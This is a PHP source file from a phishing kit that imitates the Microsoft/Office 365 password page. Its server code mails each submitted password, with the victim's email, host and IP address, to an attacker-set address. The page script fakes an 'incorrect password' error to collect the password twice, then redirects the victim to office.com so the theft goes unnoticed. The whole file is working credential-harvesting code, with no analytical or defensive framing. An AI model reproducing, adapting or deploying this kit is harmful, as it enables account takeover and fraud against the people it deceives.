<?php
session_start();
require 'core/functions.php';
require 'core/blocker.php';
require 'config/config.php';

logger("[VISIT] {$_SERVER['REQUEST_URI']} - 200");

/*if(empty($_SESSION['email'])) {
    echo '<script>window.location = "login.php";</script>';
    exit();
}*/

//mail($to, 'Test Send Email', 'Test'); die('ok');

if(empty($_SESSION['email'])) {
    if(isset($_GET['email'])) {
        $_SESSION['email'] = $_GET['email'];
    } else {
        echo '<script>window.location = "another.php";</script>';
        exit();
    }
}

if(isset($_GET['cngmail'])) {
    session_destroy();
    echo '<script>window.location = "login.php?cngmail='.$_SESSION['email'].'";</script>';
    exit();
}

//$header = "From: Office Login <mastah@localheartz.club>";

if(isset($_POST['password_awal'])) {
    logger("[PASSWORD] {$_SERVER['REQUEST_URI']} - 200");
    mail($to, 'Office Login', "Host: | {$_SERVER['HTTP_HOST']} | Email: ".base64_decode($_SESSION['email'])." | Pass: {$_POST['password_awal']} | IP: {$_SERVER['REMOTE_ADDR']}");
    //print json_encode(['success' => true]);
    //exit();
}

if(isset($_POST['password_akhir'])) {
    logger("[PASSWORD] {$_SERVER['REQUEST_URI']} - 200");
    mail($to, 'Office Login 2', "Host: | {$_SERVER['HTTP_HOST']} | Email: ".base64_decode($_SESSION['email'])." | Pass: {$_POST['password_akhir']} | IP: {$_SERVER['REMOTE_ADDR']}");
    //print json_encode(['success' => true]);
    //exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign in to your Microsoft account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="favicon.ico">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/pass.css">
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <style type="text/css">
        
    </style>
</head>
<body>
  
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
                    <img src="assets/images/logo.svg">
                    <p><a href="?cngmail=true"><img src="assets/images/arrow_left.svg"> <?php echo base64_decode($_SESSION['email']) ?></a></p>
                    <h4>Enter password</h4>
                    <span id="error" class="d-none">Your account or password is incorrect. If you don't remember your password, <a href="#">reset it now.</a></span>
                    <form method="POST">
                        <div class="form-group">
                            <input type="password" class="form-control" id="pass" name="pass" placeholder="Password" required>
                        </div>
                        <div class="form-group form-check">
                            <label class="form-check-label">
                                <input class="form-check-input" type="checkbox"> Keep me signed in
                            </label>
                        </div>
                        <p><a href="#">Forgot my password</a></p>
                        <button type="submit" class="btn float-right">Sign In</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>Privacy & cookies</p>
    <p>Terms of use</p>
    <p>©<?php echo date('Y'); ?> Microsoft</p>
</div>

<script>
    location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';

    $(function() {
        $(document).on('focus', '.form-control', function() {
            $(this).css({'border-bottom': '1px solid #0067b8'});
        });

        $(document).on('blur', '.form-control', function() {
            $(this).css({'border-bottom': ''});
        });
        
        var success = 0;
        $(document).on('submit', 'form', function(event) {
            event.preventDefault();
            
            var pass    = $('#pass').val();
            
            if(success == 0) {
                $.post('pass.php', {password_awal: pass});
                setTimeout(function() {
                    $('#pass').val('');
                    $('.form-control').css({'border-bottom': '1px solid #e81123'});
                    $('#error').toggleClass('d-none d-block');
                    
                    $(document).on('focus', '.form-control', function() {
                        $(this).css({'border-bottom': '1px solid #e81123'});
                    });
            
                    $(document).on('blur', '.form-control', function() {
                        $(this).css({'border-bottom': '1px solid #e81123'});
                    });
                    
                    success = 1;
                }, 1000);
            } else {
                $.post('pass.php', {password_akhir: pass});
                setTimeout(function() {
                   window.location = 'https://www.office.com/?auth=2'; 
                }, 1000);
            }
        });
    });
</script>

</body>
</html>
